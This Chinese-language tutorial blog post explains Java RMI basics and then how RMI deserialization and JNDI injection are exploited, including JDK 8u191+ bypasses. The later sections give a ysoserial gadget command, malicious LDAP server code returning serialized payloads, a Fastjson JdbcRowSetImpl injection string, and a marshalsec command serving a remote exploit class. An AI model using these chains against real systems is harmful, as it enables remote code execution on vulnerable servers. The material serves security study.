## java反序列化中-rmi的调用

### 1.RMI

#### 1.1RMI简介

远程方法调用RMI（Remote Method Invocation），是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。

Java本身对RMI规范的实现默认使用的是JRMP协议

JRMP：Java Remote Message Protocol ，Java 远程消息交换协议。

​       Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。

​      而RPC是远程过程调用（Remote Procedure Call）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了**过程的分布能力**。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供**分布式对象间的通讯**。

#### 1.2RMI原理

要了解RMI原理，先了解一下Stub和Skeleton两个概念。

**RMI之Stub和Skeleton**

 RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节。RMI框架为远程对象分别生成了客户端代理和服务器端代理。位于客户端的代理类称为存根（Stub），位于服务器端的代理类称为骨架（Skeleton）。

从网上找来一张图，RMI远程过程调用的实现过程如下图所示：

![image-20200201174853481](C:\Users\clover\Qclover.github.io\assets\images\java-wiki\rmi\1.png)

RMI 框架的基本原理大概如下图，应用了代理模式来封装了本地存根与真实的远程对象进行通信的细节

![image-20200201175324476](C:\Users\clover\Qclover.github.io\assets\images\java-wiki\rmi\2.png)

#### 1.3JAVA RMI示例

创建一个RMI应用包括以下四个步骤：

1）创建远程接口：继承java.rmi.Remote接口。

直接或间接继承java.rmi.Remote接口

接口中的所有方法声明抛出java.rmi.RemoteException。

2）创建远程类：实现远程接口。

通过以下两种途径之一把它导出（export）为远程对象：
       (a)导出为远程对象的第一种方式：使远程类实现远程接口时，同时继承java.rmi.server.UnicastRemoteObject类，并且远程类的构造方法必须声明抛出RemoteException。这是最常用的方式，下面的本例子就采取这种方式。
public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface
       (b)导出为远程对象的第二种方式：如果一个远程类已经继承了其他类，无法再继承UnicastRemoteObject类，那么可以在构造方法中调用UnicastRemoteObject类的静态exportObject()方法，同样，远程类的构造方法也必须声明抛出RemoteException。

```java
public class RemoteImpl extends OtherClass implements RemoteInterface{
  private String name;
  public RemoteImpl (String name)throws RemoteException{
    this.name=name;
    UnicastRemoteObject.exportObject(this,0);
  }
```

​        在构造方法RemoteImpl 中调用了UnicastRemoteObject.exportObject(this,0)方法，将自身导出为远程对象。
​        exportObject()是UnicastRemoteObject的静态方法，源码是：

​        在构造方法RemoteImpl 中调用了UnicastRemoteObject.exportObject(this,0)方法，将自身导出为远程对象。
​        exportObject()是UnicastRemoteObject的静态方法，源码是：

```java
    protected UnicastRemoteObject(int port) throws RemoteException
    {
        this.port = port;
        exportObject((Remote) this, port);
    }
    public static Remote exportObject(Remote obj, int port)
        throws RemoteException
    {
        return exportObject(obj, new UnicastServerRef(port));
    }
```

​       exportObject(Remote obj, int port)，该方法负责把参数obj指定的对象导出为远程对象，使它具有相应的存根（Stub），并监听远程客户的方法调用请求；参数port指导监听的端口，如果值为0，表示监听任意一个匿名端口。

​       exportObject(Remote obj, int port)，该方法负责把参数obj指定的对象导出为远程对象，使它具有相应的存根（Stub），并监听远程客户的方法调用请求；参数port指导监听的端口，如果值为0，表示监听任意一个匿名端口。

3）创建客户程序：通过looup()方法查找远程对象，进行远程方法调用。

 注册一个远程对象remoteObj2 关键代码如下：

```java
RemoteInterface remoteObj2 = new RemoteImpl();// 创建远程对象
Context namingContext = new InitialContext();// 初始化命名内容
LocateRegistry.createRegistry(8892);// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求
namingContext.rebind("rmi://localhost:8892/RemoteObj2", remoteObj2);// 注册对象，即把对象与一个名字绑定。
```


​     但在JDK1.3版本或更低的版本，需要使用java.rmi.Naming来注册远程对象，注册代码代替如下：

```java
RemoteInterface remoteObj = new RemoteImpl();
LocateRegistry.createRegistry(8891);
Naming.rebind("rmi://localhost:8891/RemoteObj", remoteObj);
```

【1】 bind(String name,Object obj)：注册对象，把对象与一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其它对象绑定，就会抛出NameAlreadyBoundException。
    【2】rebind(String name,Object obj)：注册对象，把对象与一个名字绑定。如果该名字已经与其它对象绑定，不会抛出NameAlreadyBoundException，而是把当前参数obj指定的对象覆盖原先的对象。
    【3】 lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象。
    【4】unbind(String name)：注销对象，取消对象与名字的绑定。





### 2.RMI利用调用

RMI的传输是基于反序列化的。

对于任何一个对象为参数的RMI接口，都可以发一个自己构建的

本地调用迫使服务器端将这个对象按任何一个存在于服务端classpath(**编译后的class文件和资源文件都放在了classes目录下**)中的可序列化类来反序列化恢复对象。

#### 2.1本地调用

受害者本地存在能被恶意利用的gadget类，如classpath存在含有漏洞版本的CommonsCollections

**Registry端存在恶意利用的gadget类--受害者成为RMI的服务端**

rmi（远程方法调用）客户端和服务端的通信主要通过客户端访问rmi**注册**表拿到存根，stub(存根)用于实现远程对象，相当于是远程对象的引用或者代理（Java RMI使用到了代理模式),存根负责接收本地方法调用,并将它们委派给各自的具体实现对象。通过它调用服务端方法，那么调用方法时要传递参数，参数可以为一般类型，也可以为引用类型，那么如果Registry端也存在CommonsCollections1 payload使用用到的类，就能被恶意利用，利用服务端已经有的gaget chain来打Server。

ps：Registry对象引用的(一个stub)由java.rmi.registry.LocateRegistry类方法获取

**Server端是作为RMI的服务端而成为受害者**

服务端存在一个公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力。

#### 2.2RMI动态类加载或JNDI注入

**此时Server端是作为RMI客户端成为受害者**

在客户端中，正常调用应该是stub.sendMessage(Message)

**前提**

无论是客户端还是服务端都需要去调用**java.rmi.server.codebaseURL**去加载对应的类。另外若要进行远程加载类需要满足：

* 1）需要安装RMISecurityManager并且配置java.security.policy

由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy

* 2）Java版本低于7u21、6u45或者设置了属性 java.rmi.server.useCodebaseOnly 的值必需为**false**

即RMI服务端允许远程加载类,还有JDK限制。

从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

PS:JNDI注入的利用方法中也借助了这种动态加载类的思路。

###    3.绕过JDK 8u191+等高版本限制

对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：

1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类（**指定远程恶意类**），并利用这个本地的Factory类执行命令。
2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。

这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。我们先来看一些基本概念，然后再分析这两种绕过方法 。

1）

JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类（Object Factory类的特性）会导致客户端命令执行。。

   2）  

LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互

如

假设目标系统中存在着有漏洞的CommonsCollections库，使用ysoserial生成一个CommonsCollections的利用Payload：

```java
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
```

LDAP Server关键代码如下，我们在javaSerializedData字段内填入刚刚生成的反序列化payload数据：

```java
...
protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
    URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
    System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
    e.addAttribute("javaClassName", "foo");
    String cbstring = this.codebase.toString();
    int refPos = cbstring.indexOf('#');
    if ( refPos > 0 ) {
        cbstring = cbstring.substring(0, refPos);
    }
    /** Payload1: Return Evil Reference Factory **/
    // e.addAttribute("javaCodeBase", cbstring);
    // e.addAttribute("objectClass", "javaNamingReference");
    // e.addAttribute("javaFactory", this.codebase.getRef());

    /** Payload2: Return Evil Serialized Gadget **/
    try {
        // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
        e.addAttribute("javaSerializedData",Base64.decode("rO0ABXNyABFqYXZhLn....."));
    } catch (ParseException e1) {
        e1.printStackTrace();
    }

    result.sendSearchEntry(e);
    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
}
...
```

模拟受害者进行JNDI lookup操作，或者使用Fastjson等漏洞模拟触发，即可看到弹计算器的命令被执行。

```java
Hashtable env = new Hashtable();
Context ctx = new InitialContext(env);
Object local_obj = ctx.lookup("ldap://127.0.0.1:1389/Exploit");

String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\" }";
JSON.parse(payload);
```

这种绕过方式需要利用一个本地的反序列化利用链（如CommonsCollections），然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用.

### 写在最后

实战中可以使用marshalsec方便的启动一个LDAP/RMI Ref Server：

```java
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]

Example:

java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/#Exploit 8088
```

本文内的相关测试代码见Github https://github.com/kxcode/JNDI-Exploit-Bypass-Demo

参考:https://www.anquanke.com/post/id/194384#h3-3

https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html

https://xz.aliyun.com/t/6660

https://www.anquanke.com/post/id/87270

